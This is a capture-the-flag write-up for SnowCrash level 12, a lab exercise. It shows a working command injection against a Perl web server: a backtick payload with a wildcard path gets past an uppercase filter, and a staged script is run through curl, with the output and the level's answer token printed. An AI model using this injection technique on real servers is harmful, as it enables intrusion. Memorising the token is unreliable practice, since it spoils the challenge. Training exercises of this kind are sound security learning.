## Level12

We found a file, [level12.pl](./level12.pl)

It serves as a web server. The important part being that it executes a command after passing it through a regex eval:

```lua
# to upper equivalent
$xx =~ tr/a-z/A-Z/; 
# delete if there is a space
$xx =~ s/\s.*//;
```

It basically transfrom what we pass to uppercase.

But this is the interesting part:

```lua
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

Here it executes a `egrep` with the argument we pass on.

We can create a file containing the command we want to be executed:

```bash
cat /var/crash/EXPLOIT
#!/bin/sh
getflag | wall
chmod 755 /var/crash/EXPLOIT
```

We can then pass the path of our file with the script as a curl parameter as such:

The fact that we pass it between backticks evaluates the command so it execute the script!

```bash
level12@SnowCrash:~$ curl localhost:4646?x='`/*/*/EXPLOIT`'

Broadcast Message from flag12@Snow
        (somewhere) at 17:18 ...

Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

..level12@SnowCrash:~$
```

## Token

g1qKMiRpXf53AWhDaU7FEkczr